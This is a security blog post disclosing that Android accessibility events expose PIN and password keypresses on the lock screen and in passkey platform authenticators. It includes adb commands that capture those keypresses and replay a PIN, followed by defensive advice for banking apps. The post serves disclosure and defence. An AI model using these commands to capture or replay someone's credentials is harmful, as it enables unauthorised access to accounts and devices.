---


title:  "Could I read your PIN/PASSWORD from platform authenticator?"

date:   2024-01-03 14:15:58

author: severus

categories: Security

tags: privacy android accessibility security

---

## Android Accessibility Service
Android provides accessibility service for disabilities people. This service can access all events on phone's screen. The security hole is that it can access platform authenticator's values: pin, password. It introduces downgrading from biometric to PIN/PASS and reduces the security of Passkey/Fido2 (builtin android support in app, not physical fido2 tokens).

## Reproduce the flaw

Android has UIAutomation class and command: uiautomator, I use uiautomator - it's same as UIAutomation class but built as binary. 

After enabling adb, on lock screen, run command: 
```sh
adb shell uiautomator events | grep Text
``` 

The result looks like:
```sh
20:01-03 16:11:57.531 EventType: TYPE_VIEW_CLICKED; EventTime: 387545686; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [DEF, 3]; ContentDescription: 3; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; ImportantForAccessibility: true; AccessibilityDataSensitive: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: 0; ScrollY: 0; MaxScrollX: 0; MaxScrollY: 0; ScrollDeltaX: -1; ScrollDeltaY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null; DisplayId: 0 ]; recordCount: 0
```
The plain key [DEF, 3] was there. Now, the accessibility service probably can read the input from platform authenticator. With key emulation, it can authenticate as user on screen with Passkey/Fido2 now.

```sh
adb shell input tap x y - switch from biometric to pin/password geometry.
adb shell input text 13337 - input pin/password.
```

## Prevention
I tested with: [Cake By VPBank](https://play.google.com/store/apps/details?id=xyz.be.cake&hl=en&gl=US) and [VCB Digi Bank](https://play.google.com/store/apps/details?id=com.VCB&hl=en&gl=US), the both are implemented correctly to prevent the service accessing password field:  
+ In VCB Digi Bank, they dispatch the accessibility events by delegating events.  
+ In Cake By VPBank, they show dot on accessibility Text value. But in fido2 mode - by default, it calls platform authenticator, still exposed pin/password to accessibility service. The password field is no matter here. 

It's very clear, the application must protect itself from accessibility service. 

Almost banking applications I tested do not have enough protection. 

The question is why google does not prevent accessibility obtaining the pin/password from authenticator platform. It's system level and it introduces new risk: downgrading from biometric to pin/password. 

Google promotes Passkey as new modern authentication method, but leaves the risk with user when platform authenticator is used. The application, indeed, must use biometric only by using [UserVerificationMethod](https://developers.google.com/android/reference/com/google/android/gms/fido/fido2/api/common/UserVerificationMethods). There is no other solution if you use platform authenticator until Google decides patching this issue. 

I have another solution, using physical tokens, which authenticate via NFC/Bluetooth like: VinCSS fido2 keys or Yubikey. 

## Conclusion
Some malwares still exploit this flaw to obtain pin/password to perform further privileged actions. 



